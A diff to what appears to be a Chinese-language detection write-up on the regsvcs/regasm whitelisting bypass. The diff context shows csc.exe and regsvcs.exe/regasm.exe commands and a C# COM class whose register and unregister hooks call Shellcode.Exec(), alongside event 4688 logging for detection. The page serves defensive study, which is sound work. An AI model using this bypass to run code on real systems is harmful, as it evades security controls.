@@ -59,39 +59,39 @@ Set-Content key.snk -Value $Content -Encoding Byte
 
 C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /r:System.EnterpriseServices.dll /target:library /out:regsvcs.dll /keyfile:key.snk regsvcs.cs
 
-C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe regsvcs.dll 
+C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe regsvcs.dll
 [OR]
 C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe regsvcs.dll
 //Executes UnRegisterClass If you don't have permissions
 
-C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe /U regsvcs.dll 
+C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe /U regsvcs.dll
 C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U regsvcs.dll
 //This calls the UnregisterClass Method
 
 */
 namespace regsvcser
 {
-    
+
     public class Bypass : ServicedComponent
     {
         public Bypass() { Console.WriteLine("I am a basic COM Object"); }
-		
-		[ComRegisterFunction] //This executes if registration is successful
-		public static void RegisterClass ( string key )
-		{
-			Console.WriteLine("I shouldn't really execute");
-			Shellcode.Exec();
-		}
-		
-		[ComUnregisterFunction] //This executes if registration fails
-		public static void UnRegisterClass ( string key )
-		{
-			Console.WriteLine("I shouldn't really execute either.");
-			Shellcode.Exec();
-		}
+
+        [ComRegisterFunction] //This executes if registration is successful
+        public static void RegisterClass ( string key )
+        {
+            Console.WriteLine("I shouldn't really execute");
+            Shellcode.Exec();
+        }
+
+        [ComUnregisterFunction] //This executes if registration fails
+        public static void UnRegisterClass ( string key )
+        {
+            Console.WriteLine("I shouldn't really execute either.");
+              Shellcode.Exec();
+        }
     }
-	
-	public class Shellcode
+
+    public class Shellcode
     {
         public static void Exec()
         {
@@ -233,7 +233,7 @@ Server SID: S-1-5-21-3661619627-1912079458-2426250727-500
 
 经过配置后安全日志能够清晰的记录命令行参数，截取windows安全事件4688进程创建部分内容：
 
-```bash
+```log
 进程信息: #4688-1
 新进程 ID:0x9f8
 新进程名称:C:\Windows\Microsoft.NET\Framework\v4.0.30319\RegAsm.exe
